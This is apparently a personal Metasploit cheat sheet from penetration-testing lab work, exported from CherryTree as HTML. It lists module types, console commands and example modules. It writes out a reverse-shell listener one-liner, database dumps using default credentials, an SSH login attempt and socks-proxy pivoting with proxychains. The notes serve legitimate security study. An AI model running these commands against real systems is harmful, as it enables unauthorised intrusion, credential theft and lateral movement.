<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>msfconsole</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>msfconsole</h1><br/><p><strong>Modules in Metasploit Framework:</strong></p><p></p><p><strong>Location: /usr/share/metasploit-framework/modules</strong></p><p></p><p><strong>Auxiliary: </strong>Any supporting module, such as scanners, crawlers and fuzzers, can be found here. </p><p><strong>Encoders: </strong>Encoders will allow you to encode the exploit and payload  in the hope that a signature-based antivirus solution may miss them.</p><p><strong>Evasion: </strong>While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.<strong> </strong>For this we use Evasion.</p><p><strong>Exploits: </strong>Exploits, neatly organized by target system.</p><p><strong>NOPs: </strong>NOPs (No OPeration) do nothing, literally. CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.</p><p><strong>Payloads: </strong>Payloads are codes that will run on the target system. </p><p>		<strong>----3 Types----</strong></p><p>		<strong>Singles:</strong> Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.</p><p>		<strong>Stagers:</strong> Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.</p><p>		<strong>Stages: </strong>Downloaded by the stager. This will allow you to use larger sized payloads.</p><p><strong>Post: </strong>Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.		</p><p></p><p>Summary:</p><p><strong>Stageless 	---&gt; Singles</strong></p><p><strong>Staged 		---&gt; Stagers + Stages</strong></p><p></p><p><strong>msfconsole:</strong></p><p>(Acts as a normal shell)</p><p></p><p>help search 				: 	To get details about search and all complex filters</p><p>ls									:	List contents of dir from where msfconsole was launched</p><p>ping -c1 google.com 	: 	Example of Ping command in msfconsole</p><p>clear							:	Used to clear the screen</p><p>history							:	Used to find previous commands</p><p></p><p>Note: No Output redirection</p><p></p><p></p><p>use &lt;module name&gt;	:	Used to select an module eg. use exploit/windows/smb/ms17_010_eternalblue</p><p>show &lt;mdole name&gt;: 	Used to show about a particular module. eg. show all, show auxillary</p><p>show options				:	Used to print the options for a particular context (Module).</p><p>show payloads			:	USed to list payloads for a particular exploit</p><p>back							:	To leave and exit a context/module</p><p>info								: 	Further information about any module (From inside a context)</p><p>info &lt;mdoule&gt;			:	To show info about any module.</p><p>search &lt;module&gt;		:	You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.</p><p>										eg. search type:auxillary telnet</p><p>										</p><p></p><p></p><p><strong>Ranking:</strong></p><p></p><p><img src="images/84-1.png" alt="images/84-1.png" /></p><p></p><p><strong>Setting Options:</strong></p><p></p><p>set PARAMETER_NAME VALUE				:	Used to set VALUE for the PARAMETER_NAME</p><p>set RHOST 10.0.0.2								:	Single IP</p><p>set RHOST 10.0.0.2-10.0.0.25				:	Range</p><p>set RHOST 10.0.0.2/24							:	Range in CIDR(Classless Inter Domain Routing) notation</p><p>set RHOST file:/home/targets.txt			:	Range of IP in file (One per line)</p><p></p><p>unset PARAMETER_NAME						:	Removes the particular parameter value</p><p>unset all													:	Removes the stored value of all parameters</p><p></p><p>setg PARAMETER_NAME VALUE				: 	Global Parameter setting (Sets till you exit metasploit or use unsetg)</p><p>unsetg PARAMETER_NAME						:	Global Parameter reset</p><p></p><p><strong>Launching &amp; Backgrond:</strong></p><p></p><p>run			:	To Launch the module</p><p>exploit		:	To Launch the module</p><p>exploit -z	:	To Launch the module in background</p><p>exploit -j :	To Launch a job in background</p><p></p><p>check		:	Few modules support check. It is used to check if the target system is vulnerable without exploiting it</p><p></p><p></p><p>background or Ctrl+z		:	To move a session to background</p><p>sessions							:	It shows all the sessions</p><p>sessions -h						;	To show all options of session command</p><p>sessions -i &lt;id&gt;				: 	To interact with the session</p><p></p><p></p><p><strong>Usage:</strong></p><p></p><p>Auxiliary:</p><p>auxiliary/scanner/portscan/tcp</p><p>auxiliary/scanner/discovery/udp_sweep</p><p>auxiliary/scanner/smb/smb_version</p><p>auxiliary/scanner/http/http_version</p><p>auxiliary/scanner/smb/smb_login</p><p></p><p>Exploits:</p><p>exploit/windows/smb/psexec								: Admin username and password is required</p><p>exploit/windows/local/bypassuac_eventvwr	: Used for windows Priviege Escalation</p><p>exploit/windows/http/icecast_header				: Exec Code Execution for Icecast Steaming Media Server</p><p></p><p>Post:</p><p>post/windows/gather/enum_domain		:	Used to enumerate domains</p><p>post/windows/gather/enum_shares		:	Used to enumerate shares</p><p>post/windows/gather/hashdump			:	To get the local hashes</p><p></p><p><strong>Metasploit Database Integration:</strong></p><p></p><p>systemctl start postgresql.service				:	Start Postgresql that Metasploit will use</p><p>msfdb init														:	initialize the db in Metasploit</p><p></p><p>Inside msfconsole:</p><p>db_status														:	To check status of db in metasploit</p><p>workspace														:	Used to show the current workspace (Default). We can use different for different projects</p><p>workspace -a tryhackme								: 	To add a workspace named tryhackme</p><p>workspace -d tryhackme								:	To delete a workspace named tryhackme</p><p>workspace default											:	To navigate between workspaces</p><p>workspace -h													:	To list all workspace commands</p><p></p><p></p><p>To Run nmap:</p><p>db_nmap -sV -sC &lt;Target_IP&gt;						: 	Runs nmap and stores inside the database</p><p>hosts																:	List all scanned hosts</p><p>services															;	List all scanned services</p><p>hosts -h															:	For more options. eg hosts -R :Will add the items in hosts to RHOST of an exploit/payload</p><p>services -h														:	For more options. eg services -S netbios :Will search for the service in database</p><p></p><p><strong><span style="text-decoration:underline;">One Liner for Starting a Listener:</span></strong></p><p></p><p><strong>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.67.27; set LPORT 8888;exploit&quot;</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Checking Without Running (Example):</span></strong></p><p></p><p>Add an exploit (Say Larabel RCE) then,</p><p><strong>check rhost=10.10.119.225 HttpClientTimeout=20</strong></p><p></p><p></p><p></p><p></p><p><strong><h2>Routing:</h2></strong></p><p>           </p><p># Example usage</p><p><strong>route [add/remove] subnet netmask [comm/sid]</strong></p><p></p><p># Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session</p><p><strong>route add 172.17.0.1/32 -1</strong></p><p></p><p># Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session</p><p><strong>route add 172.28.10.48/29 -1</strong></p><p></p><p># Output the routing table</p><p><strong>route print</strong></p><p></p><p></p><p></p><p><strong><h3>Dumping Postgres DB &amp; Reading from a particular DB:</h3></strong></p><p>(DB Username = postgres &amp; Password = postgres)</p><p>           </p><p># Dump the schema</p><p></p><p><strong>use auxiliary/scanner/postgres/postgres_schemadump</strong></p><p><strong>run postgres://postgres:postgres@172.28.101.51/postgres</strong></p><p></p><p># Select information from a specific table</p><p></p><p><strong>use auxiliary/admin/postgres/postgres_sql</strong></p><p><strong>run postgres://postgres:postgres@172.28.101.51/postgres sql=&#39;select * from users&#39;</strong></p><p></p><p></p><p><strong><h3>SSH Logging</h3></strong></p><p></p><p><strong>use auxiliary/scanner/ssh/ssh_login</strong></p><p><strong>run ssh://santa_username_here:santa_password_here@172.17.0.1</strong></p><p></p><p></p><p><strong><h2>Pivoting:</h2></strong></p><p></p><p><strong>Socks Proxy</strong></p><p></p><p>A socks proxy is an intermediate server that supports relaying networking traffic between two machines. This tool allows you to implement the technique of pivoting. You can run a socks proxy either locally on a pentester’s machine via Metasploit, or directly on the compromised server. In Metasploit, this can be achieved with the <strong>auxiliary/server/socks_proxy</strong> module:</p><p></p><p><span style="text-decoration:underline;">Example:</span></p><p><strong>use auxiliary/server/socks_proxy</strong></p><p><strong>run srvhost=127.0.0.1 srvport=9050 version=4a</strong></p><p></p><p>Tools such as <strong>curl</strong> support sending requests through a socks proxy server via the <strong>--proxy</strong> flag:</p><p><span style="text-decoration:underline;">Example:</span>     </p><p><strong>curl --proxy socks4a://localhost:9050 http://10.10.3.43</strong></p><p></p><p><strong>Note</strong></p><p>If the tool does not natively support an option for using a socks proxy, <strong>ProxyChains</strong> can intercept the tool’s request to open new network connections and route the request through a socks proxy instead. For instance, an <strong>example</strong> with <strong>Nmap</strong>:</p><p>        </p><p><strong>proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.3.43</strong></p><p></p></div>
</body>
</html>
